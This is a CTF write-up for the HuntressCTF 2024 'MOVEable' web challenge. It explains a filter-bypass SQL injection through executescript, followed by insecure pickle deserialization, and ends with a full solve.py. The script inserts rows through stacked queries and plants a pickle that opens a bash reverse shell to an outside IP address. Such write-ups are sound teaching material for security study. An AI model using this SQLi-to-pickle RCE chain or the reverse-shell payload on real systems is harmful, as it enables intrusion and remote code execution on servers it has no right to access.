---
title: HuntressCTF 2024 MOVEable
draft: false
tags:
  - ctf
  - web-exploitation
  - sqli
---

# MOVEable

> Ever wanted to move your files? You know, like with a fancy web based GUI instead of just FTP or something?   Well now you can, with our super secure app, **MOVEable**!  Escalate your privileges and find the flag.

We're provided with a simple Flask application, with just one component: `app.py`. Based on the name, `MOVEable` and because this is HuntressCTF (which means John Hammond is involved) I figured this is a reference to `MOVEit` because of the name and the fact John Hammond helped research MOVEit to uncover the attack chain. For those unfamiliar, the MOVEit vulnerability allowed unauthenticated RCE via SQLi and deserialization. 

The first thing I looked at was the login functionality:

```python
@app.route('/login', methods=['POST'])
def login_user():
    username = DBClean(request.form['username'])
    password = DBClean(request.form['password'])
    print(username, password)
    
    conn = get_db()
    c = conn.cursor()
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(sql)
    c.executescript(sql)
    user = c.fetchone()
    print(user)
    if user:
        c.execute(f"SELECT sessionid FROM activesessions WHERE username=?", (username,))
        active_session = c.fetchone()
        if active_session:
            session_id = active_session[0]
        else:
            c.execute(f"SELECT username FROM users WHERE username=?", (username,))
            user_name = c.fetchone()
            if user_name:
                session_id = str(uuid.uuid4())
                c.executescript(f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')")
            else:
                flash("A session could be not be created")
                return logout()
```

Immediately, two things stood out:
1) The SQL query is crafted via injecting variables aka no parameterization
2) We use `executescript` instead of `execute` which means we can run other queries besides the `SELECT` statement

However, there is also a DBClean function, which (in theory) sanitizes input from SQL injection. It strips ` `, `'`, and `"` and replaces `\` with `'`'. 

```python
def DBClean(string):
    for bad_char in " '\"":
        string = string.replace(bad_char,"")
    return string.replace("\\", "'")
```

So we'll probably have to bypass this filter to get SQL injection to login as a user. Let's keep on looking through the code, the next piece the download functionality:

```python
@app.route('/download/<filename>/<sessionid>', methods=['GET'])
def download_file(filename, sessionid):
    conn = get_db()
    c = conn.cursor()
    c.execute(f"SELECT * FROM activesessions WHERE sessionid=?", (sessionid,))
    
    active_session = c.fetchone()
    if active_session is None:
        flash('No active session found')
        return redirect(url_for('home'))
    c.execute(f"SELECT data FROM files WHERE filename=?",(filename,))
    
    file_data = c.fetchone()
    if file_data is None:
        flash('File not found')
        return redirect(url_for('files'))

    file_blob = pickle.loads(base64.b64decode(file_data[0]))
    print(file_blob)
    try:    
        return send_file(io.BytesIO(file_blob), attachment_filename=filename, as_attachment=True)
    except Exception as e:
        print(e)
        flash("ERROR: Failed to retrieve file. Are you trying to hack us?!?")
        return redirect(url_for('files'))
```

This is a GET request which takes a `filename` and `sessionid` parameter and will retrieve a file via unpickling.  Remember that `MOVEit` exploited deserialization and here we are... using `pickle`:

> “Pickling” is **the process whereby a Python object hierarchy is converted into a byte stream**, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy. (https://docs.python.org/3/library/pickle.html)


![[Pasted image 20241018144415.png]]

So, now we have an attack chain planned out.
1. SQL injection to get a valid user session ID
2. Download `flag.txt` using the provided session ID

Which seems easy, but in reality, it isn't. If we look at the `init_db` function:

```python
def init_db():
    with app.app_context():
        db = get_db()
        c = db.cursor()

        c.execute("CREATE TABLE IF NOT EXISTS users (username text, password text)")
        c.execute("CREATE TABLE IF NOT EXISTS activesessions (sessionid text, username text, timestamp text)")
        c.execute("CREATE TABLE IF NOT EXISTS files (filename text PRIMARY KEY, data blob, sessionid text)")

        c.execute("INSERT OR IGNORE INTO files VALUES ('flag.txt', ?, NULL)",
                  (base64.b64encode(pickle.dumps(b'lol just kidding this isnt really where the flag is')).decode('utf-8'),))
        c.execute("INSERT OR IGNORE INTO files VALUES ('NahamCon-2024-Speakers.xlsx', ?, NULL)",
                  (base64.b64encode(pickle.dumps(b'lol gottem')).decode('utf-8'),))
        db.commit()
```

It poses problems with our plan. The first being that there are no users and the second being the `flag.txt` is not really a flag. So, we need to adjust our attack chain:

1. SQL injection to INSERT a user into the `users` table
2. SQL injection to INSERT a session into the `activesession` table
3. SQL injection to INSERT a malicious pickle into the `files` table
4. Then call the `/download/<file>/<session>` to get our pickle to execute!

With a gameplan in mind, let's attack it. I first started by creating the inverse of DBClean, so I could create normal SQL queries without needing to constantly consider filter bypasses.

```python
def DBEvil(string):
    # Convert a normal SQL injection string into one that will bypass the DBClean function
    evil = ""
    for i in range(0, len(string)):
        if string[i] == "'":
            evil += "\\'"
        elif string[i] == " ":
            evil += "/**/"
        elif string[i] == "\"":
            evil += "\\\""
        else:
            evil += string[i]
    return evil
```

This replaces `'` with `\` (which DBClean will then turn back into a `'`), spaces into `/**/` which SQLite will parse as whitespace, and `"` with `\"`. 

Next, we generate our queries. For example, inserting a malicious user. And just a reminder, we're able to call multiple queries, ie: `SELECT ...; INSERT` because the Flask app uses `.executescript()`. If it uses `.execute()`, this specific attack chain would have been mitigated.

```python
DBEvil("' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'hacker'); --")

# \'/**/OR/**/1=1;/**/INSERT/**/INTO/**/users/**/(username,/**/password)/**/VALUES/**/(\'hacker\',/**/\'hacker\');/**/--
```

We do the same thing for session:

```python
_uuid = str(uuid.uuid4())

DBEvil(f"' OR 1=1; INSERT INTO activesessions (sessionid, username, timestamp) VALUES ('{_uuid}', 'hacker', '2024-10-18 13:27:27.549650'); --")
```

And then we generate our malicious pickle:

```python
class ReadFlag:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['bash', '-c', 'bash -i >& /dev/tcp/37.120.205.205/47465 0>&1'],))

_filename = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))

pickle_data = base64.b64encode(pickle.dumps(ReadFlag())).decode('utf-8')

insert_file = DBEvil(f"' OR 1=1; INSERT INTO files (filename, data, sessionid) VALUES ('{_filename}', '{pickle_data}', '{_uuid}'); --")
```

We now have three SQL queries which will insert a user, session, and file. All we need to do now is `/download/<filename>/<session>` and when `pickle.loads()` is called, our pickle will get unpickled and turned into a Python object, causing `subprocess` to run our reverse shell! Putting it all together into a `solve.py`:

```python
import pickle
import base64
import requests
import uuid
import random

# class ReadFlag:
#     def __reduce__(self):
#         import subprocess
#         return (subprocess.check_output, (['cat', '/tmp/database.db'],))

# /bin/bash -i >& /dev/tcp/37.120.205.205/47465 0>&1
class ReadFlag:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['bash', '-c', 'bash -i >& /dev/tcp/37.120.205.205/47465 0>&1'],))

def DBClean(string):
    # This blocks the following characters: [ [space], ', "]
    # Converts all backslashes to single quotes
    for bad_char in " '\"":
        string = string.replace(bad_char,"")
    return string.replace("\\", "'")

def DBEvil(string):
    # Convert a normal SQL injection string into one that will bypass the DBClean function
    evil = ""
    for i in range(0, len(string)):
        if string[i] == "'":
            evil += "\\'"
        elif string[i] == " ":
            evil += "/**/"
        elif string[i] == "\"":
            evil += "\\\""
        else:
            evil += string[i]
    return evil

# c.execute("CREATE TABLE IF NOT EXISTS users (username text, password text)")
# c.execute("CREATE TABLE IF NOT EXISTS activesessions (sessionid text, username text, timestamp text)")
# c.execute("CREATE TABLE IF NOT EXISTS files (filename text PRIMARY KEY, data blob, sessionid text)")

BASE = "http://challenge.ctf.games:32217/"

_uuid = str(uuid.uuid4())
_filename = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
print(_uuid, _filename)

# Register a new user
insert_user = DBEvil("' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'hacker'); --")
print(insert_user)
r = requests.post(BASE + "login", data={"username": insert_user, "password": "hacker"})
if "Username or password is incorrect" in r.text:
    print("Payload sent")
else:
    print(r.text)
    exit()

# Insert a new session for the user
insert_session = DBEvil(f"' OR 1=1; INSERT INTO activesessions (sessionid, username, timestamp) VALUES ('{_uuid}', 'hacker', '2024-10-18 13:27:27.549650'); --")
r = requests.post(BASE + "login", data={"username": insert_session, "password": "hacker"})
if "Username or password is incorrect" in r.text:
    print("Payload sent")
else:
    print(r.text)
    exit()

# Insert a new file with RCE pickle data
pickle_data = base64.b64encode(pickle.dumps(ReadFlag())).decode('utf-8')
insert_file = DBEvil(f"' OR 1=1; INSERT INTO files (filename, data, sessionid) VALUES ('{_filename}', '{pickle_data}', '{_uuid}'); --")
r = requests.post(BASE + "login", data={"username": insert_file, "password": "hacker"})
if "Username or password is incorrect" in r.text:
    print("Payload sent")
else:
    print(r.text)
    exit()

# Get the flag
r = requests.get(BASE + f"download/{_filename}/{_uuid}")
with open("flag.txt", "wb") as f:
    f.write(r.content)
```